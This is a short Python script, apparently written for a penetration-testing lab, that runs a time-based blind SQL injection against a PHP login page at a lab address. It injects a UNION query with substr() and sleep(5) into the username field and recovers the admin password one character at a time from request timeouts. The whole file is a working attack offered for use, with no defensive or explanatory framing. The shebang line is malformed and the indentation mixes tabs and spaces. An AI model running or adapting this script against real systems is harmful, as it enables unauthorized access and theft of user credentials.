#!/usr/env python

import requests
import string

query = "' union SELECT * from user_info WHERE username = 'admin' and substr(password, %d, 1) = binary '%s' and sleep(5) -- "

chars = string.ascii_letters + '0123456789'

print("blind sql bruteforce attack! what time is it ?")
for i in range(1, 100):
    found = False
    for c in chars:
        try:
            requests.post("http://10.11.1.xxx:8000/index.php", 
                    data={"username": query % (i, c), "password": "pass", "submit": "Log In"},
                          timeout=2)
        except requests.exceptions.Timeout:
            #print(c, end="", flush=True)
	    print(c)
            found = True
            break
    if not found:
        break

print("\nDone!")
